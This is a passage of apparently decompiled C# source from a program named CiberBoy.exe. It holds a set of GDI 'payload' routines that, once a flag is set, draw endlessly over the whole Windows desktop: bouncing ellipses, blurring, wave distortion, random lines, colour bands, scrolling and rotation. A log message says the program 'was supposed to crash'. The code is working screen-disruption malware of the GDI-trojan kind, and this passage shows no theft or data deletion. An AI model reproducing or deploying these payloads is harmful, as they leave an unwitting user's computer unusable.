        gdi.GdiAlphaBlend(dc, 100, 100, width, height, compatibleDc, 0, 0, width, height, gdi.BlendFunction);
        gdi.GdiAlphaBlend(dc, -100, -100, width, height, compatibleDc, 0, 0, width, height, gdi.BlendFunction);
        gdi.DrawIcon(dc, int_0, int_1, intptr_1);
        Thread.Sleep(1);
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    private static void smethod_7()
    {
      int x = 1;
      int y = 1;
      int num1 = 7;
      int num2 = 7;
      int num3 = 120;
      while (true)
      {
        int maxValue = (int) byte.MaxValue;
        int num4 = 0;
        int blue1 = 0;
        if (!gdi.payloadsactivated)
        {
          maxValue = (int) byte.MaxValue;
          num4 = 0;
        }
        else
        {
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          int width = bounds.Width;
          bounds = Screen.PrimaryScreen.Bounds;
          int height = bounds.Height;
          IntPtr dc = gdi.GetDC(IntPtr.Zero);
          IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
          IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
          IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          int red1 = 250;
          int green1 = 0;
          for (int index = 0; index < 25; ++index)
          {
            red1 -= 10;
            green1 += 10;
            gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
            Brush brush1 = (Brush) new SolidBrush(Color.FromArgb((int) byte.MaxValue, 0, 0, 0));
            Thread.Sleep(10);
            graphics.FillEllipse(brush1, x - 1, y - 1, num3 + 2, num3 + 2);
            Brush brush2 = (Brush) new SolidBrush(Color.FromArgb((int) byte.MaxValue, red1, green1, blue1));
            graphics.FillEllipse(brush2, x, y, num3, num3);
            gdi.BitBlt(dc, 0, 0, width, height, compatibleDc, 0, 0, 13369376U);
            graphics.Dispose();
            gdi.blur2();
            x += num1;
            y += num2;
            if ((x <= 0 ? 1 : (x + num3 >= width ? 1 : 0)) != 0)
              num1 = -num1;
            if ((y > 0 ? (y + num3 >= height ? 1 : 0) : 1) != 0)
              num2 = -num2;
          }
          int red2 = 0;
          int green2 = 250;
          for (int index = 0; index < 25; ++index)
          {
            green2 -= 10;
            blue1 += 10;
            gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
            Brush brush3 = (Brush) new SolidBrush(Color.FromArgb((int) byte.MaxValue, 0, 0, 0));
            Thread.Sleep(10);
            graphics.FillEllipse(brush3, x - 1, y - 1, num3 + 2, num3 + 2);
            Brush brush4 = (Brush) new SolidBrush(Color.FromArgb((int) byte.MaxValue, red2, green2, blue1));
            graphics.FillEllipse(brush4, x, y, num3, num3);
            gdi.BitBlt(dc, 0, 0, width, height, compatibleDc, 0, 0, 13369376U);
            graphics.Dispose();
            gdi.blur2();
            x += num1;
            y += num2;
            if ((x <= 0 ? 1 : (x + num3 >= width ? 1 : 0)) != 0)
              num1 = -num1;
            if ((y <= 0 ? 1 : (y + num3 >= height ? 1 : 0)) != 0)
              num2 = -num2;
          }
          int blue2 = 250;
          int red3 = 0;
          for (int index = 0; index < 25; ++index)
          {
            blue2 -= 10;
            red3 += 10;
            gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
            Brush brush5 = (Brush) new SolidBrush(Color.FromArgb((int) byte.MaxValue, 0, 0, 0));
            Thread.Sleep(10);
            graphics.FillEllipse(brush5, x - 1, y - 1, num3 + 2, num3 + 2);
            Brush brush6 = (Brush) new SolidBrush(Color.FromArgb((int) byte.MaxValue, red3, green2, blue2));
            graphics.FillEllipse(brush6, x, y, num3, num3);
            gdi.BitBlt(dc, 0, 0, width, height, compatibleDc, 0, 0, 13369376U);
            graphics.Dispose();
            gdi.blur2();
            x += num1;
            y += num2;
            if ((x <= 0 ? 1 : (x + num3 >= width ? 1 : 0)) != 0)
              num1 = -num1;
            if ((y > 0 ? (y + num3 >= height ? 1 : 0) : 1) != 0)
              num2 = -num2;
          }
          graphics.Dispose();
          gdi.DeleteDC(dc);
          gdi.DeleteDC(compatibleDc);
          gdi.DeleteObject(compatibleBitmap);
          gdi.DeleteObject(hObject);
        }
      }
    }

    public static void blur2()
    {
      Random random = new Random();
      IntPtr dc = gdi.GetDC(IntPtr.Zero);
      int width = Screen.PrimaryScreen.Bounds.Width;
      int height = Screen.PrimaryScreen.Bounds.Height;
      gdi.LoadCursor(IntPtr.Zero, 32512);
      random.Next(width);
      random.Next(height);
      int y = Cursor.Position.Y;
      int x = Cursor.Position.X;
      IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
      IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
      IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
      gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
      gdi.GdiAlphaBlend(dc, random.Next(-5, 5), random.Next(-5, 5), width, height, compatibleDc, 0, 0, width, height, gdi.BlendFunction);
      gdi.DeleteDC(dc);
      gdi.DeleteDC(compatibleDc);
      gdi.DeleteObject(compatibleBitmap);
      gdi.DeleteObject(hObject);
    }

    public static void rndcolors()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        int width = bounds.Width;
        bounds = Screen.PrimaryScreen.Bounds;
        int height = bounds.Height;
        gdi.LoadCursor(IntPtr.Zero, 32512);
        random.Next(width);
        random.Next(height);
        int y1 = Cursor.Position.Y;
        int x = Cursor.Position.X;
        for (int y2 = 0; y2 < height; y2 += 10)
        {
          try
          {
            Brush brush = (Brush) new SolidBrush(Color.FromArgb(30, gdi.R, gdi.G, gdi.B));
            Graphics.FromHdc(dc).FillRectangle(brush, 0, y2, width, 10);
            Graphics.FromHdc(dc).Dispose();
          }
          catch (Exception ex)
          {
            Console.WriteLine("CiberBoy.exe was supposed to crash! Not today, though... " + (ex == null ? (string) null : ex.ToString()));
          }
        }
        Graphics.FromHdc(dc).Dispose();
        gdi.DeleteDC(dc);
        Thread.Sleep(1);
      }
    }

    private static void smethod_8()
    {
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        for (int index = 0; index < height; ++index)
        {
          IntPtr dc = gdi.GetDC(IntPtr.Zero);
          int int_0 = (int) (Math.Sin(((double) index + gdi.waveAngle) * 0.05) * 10.0);
          gdi.StretchBlt(dc, int_0, index, width, 1, dc, 0, index, width, 1, 6684742U);
          gdi.DeleteDC(dc);
        }
        gdi.waveAngle += 9.0;
        ++gdi.flipCounter;
        Thread.Sleep(75);
      }
    }

    public static void penmess()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        int x1 = random.Next(width);
        int y1 = random.Next(height);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        Graphics graphics = Graphics.FromHdc(dc);
        Pen pen = new Pen(Color.FromArgb((int) byte.MaxValue, random.Next(1, (int) byte.MaxValue), random.Next(1, (int) byte.MaxValue), random.Next(1, (int) byte.MaxValue)), (float) random.Next(1, 30));
        graphics.DrawLine(pen, x1, y1, random.Next(width), random.Next(height));
        Thread.Sleep(10);
        graphics.Dispose();
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void diagonalscrolling()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        random.Next(width);
        random.Next(height);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
        gdi.GdiAlphaBlend(dc, 100, -100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128, (byte) 0));
        gdi.GdiAlphaBlend(dc, -width + 100, -100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128, (byte) 0));
        gdi.GdiAlphaBlend(dc, -width + 100, height - 100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128, (byte) 0));
        gdi.GdiAlphaBlend(dc, 100, height - 100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128, (byte) 0));
        Thread.Sleep(65);
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void rotation1()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        random.Next(width);
        random.Next(height);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        int[] numArray1 = new int[4]{ 20, 25, 50, 65 };
        uint[] numArray2 = new uint[2]
        {
          6684742U,
          12255782U
        };
        gdi.POINT[] point_0 = new gdi.POINT[3];
        if (random.Next(2) == 1)
        {
          point_0[0].X = -20;
          point_0[0].Y = 20;
          point_0[1].X = width - 20;
          point_0[1].Y = -20;
          point_0[2].X = 20;
          point_0[2].Y = height + 20;
        }
        else
        {
          point_0[0].X = 20;
          point_0[0].Y = -20;
          point_0[1].X = width + 20;
          point_0[1].Y = 20;
          point_0[2].X = -20;
          point_0[2].Y = height - 20;
        }
        int millisecondsTimeout = numArray1[random.Next(numArray1.Length)];
        int num = (int) numArray2[random.Next(numArray2.Length)];
        for (int index = 0; index < random.Next(3, 12); ++index)
        {
          Thread.Sleep(millisecondsTimeout);
          gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
          gdi.PlgBlt(compatibleDc, point_0, dc, 0, 0, width, height, IntPtr.Zero, 0, 0);
          gdi.BitBlt(dc, 0, 0, width, height, compatibleDc, 0, 0, 6684742U);
        }
        gdi.clear();
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void randomrotation()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        random.Next(width);
        random.Next(height);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        new int[4]{ 20, 25, 50, 65 };
        uint[] numArray = new uint[2]{ 6684742U, 12255782U };
        gdi.POINT[] point_0 = new gdi.POINT[3];
        point_0[0].X = random.Next(-100, 100);
        point_0[0].Y = random.Next(-100, 100);
        point_0[1].X = width + random.Next(-100, 100);
        point_0[1].Y = random.Next(-100, 100);
        point_0[2].X = -random.Next(-100, 100);
        point_0[2].Y = height - random.Next(-100, 100);
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
        gdi.PlgBlt(compatibleDc, point_0, compatibleDc, 0, 0, width, height, IntPtr.Zero, 0, 0);
        gdi.BitBlt(dc, 0, 0, width, height, compatibleDc, 0, 0, 6684742U);
        Thread.Sleep(125);
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void smethod_9()
    {
      gdi.A = (int) byte.MaxValue;
      gdi.R = (int) byte.MaxValue;
      gdi.G = 0;
      gdi.B = 0;
label_9:
      for (int index = 0; index < (int) byte.MaxValue; ++index)
      {
        --gdi.R;
        ++gdi.G;
      }
      gdi.R = 0;
      gdi.G = (int) byte.MaxValue;
      for (int index = 0; index < (int) byte.MaxValue; ++index)
      {
        --gdi.G;
        ++gdi.B;
      }
      gdi.B = (int) byte.MaxValue;
      gdi.R = 0;
      for (int index = 0; index < (int) byte.MaxValue; ++index)
      {
        --gdi.B;
        ++gdi.R;
      }
      goto label_9;
    }

    public static void clear() => gdi.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);

    public static void constantClearing()
    {
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        Thread.Sleep(500);
        gdi.clear();
      }
    }

    public struct BITMAPINFOHEADER
    {
      public uint biSize;
      public int biWidth;
      public int biHeight;
      public ushort biPlanes;
      public ushort biBitCount;
      public uint biSizeImage;
      public int biXPelsPerMeter;
      public int biYPelsPerMeter;
      public uint biClrUsed;
      public uint biClrImportant;
      public uint biCompression;

      public void Init() => this.biSize = (uint) Marshal.SizeOf((object) this);
    }

    public struct RECT(int left, int top, int right, int bottom)
    {
      public int Left = left;
      public int Top = top;
      public int Right = right;
      public int Bottom = bottom;

      public RECT(Rectangle r)
        : this(r.Left, r.Top, r.Right, r.Bottom)
      {
      }

      public int X
      {
        get => this.Left;
        set
        {
          this.Right -= this.Left - value;
          this.Left = value;
        }
      }

      public int Y
      {
        get => this.Top;
        set
        {
          this.Bottom -= this.Top - value;
          this.Top = value;
        }
      }

      public int Height
      {
        get => this.Bottom - this.Top;
        set => this.Bottom = value + this.Top;
      }

      public int Width
      {
        get => this.Right - this.Left;
        set => this.Right = value + this.Left;
      }

      public Point Location
      {
        get => new Point(this.Left, this.Top);
        set
        {
          this.X = value.X;
          this.Y = value.Y;
        }
      }

      public Size Size
      {
        get => new Size(this.Width, this.Height);
        set
        {
          this.Width = value.Width;
          this.Height = value.Height;
        }
      }

      public static implicit operator Rectangle(gdi.RECT r)
      {
        return new Rectangle(r.Left, r.Top, r.Width, r.Height);
      }

      public static implicit operator gdi.RECT(Rectangle r) => new gdi.RECT(r);

      public static bool operator ==(gdi.RECT r1, gdi.RECT r2) => r1.Equals(r2);

      public static bool operator !=(gdi.RECT r1, gdi.RECT r2) => !r1.Equals(r2);

      public bool Equals(gdi.RECT r)
      {
        return r.Left == this.Left && r.Top == this.Top && r.Right == this.Right && r.Bottom == this.Bottom;
      }

      public override bool Equals(object obj)
      {
        bool flag;
        switch (obj)
        {
          case gdi.RECT r1:
            flag = this.Equals(r1);
            break;
          case Rectangle r2:
            flag = this.Equals(new gdi.RECT(r2));
            break;
          default:
            flag = false;
            break;
        }
        return flag;
      }

      public override int GetHashCode() => ((Rectangle) this).GetHashCode();

      public override string ToString()
      {
        return string.Format((IFormatProvider) CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", (object) this.Left, (object) this.Top, (object) this.Right, (object) this.Bottom);
      }
    }

    public struct POINT(int x, int y)
    {
      public int X = x;
      public int Y = y;

      public static implicit operator Point(gdi.POINT p) => new Point(p.X, p.Y);

      public static implicit operator gdi.POINT(Point p) => new gdi.POINT(p.X, p.Y);
    }

    public struct BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
    {
      private byte byte_0 = op;
      private byte byte_1 = flags;
      private byte byte_2 = alpha;
      private byte byte_3 = format;
    }
  }
}
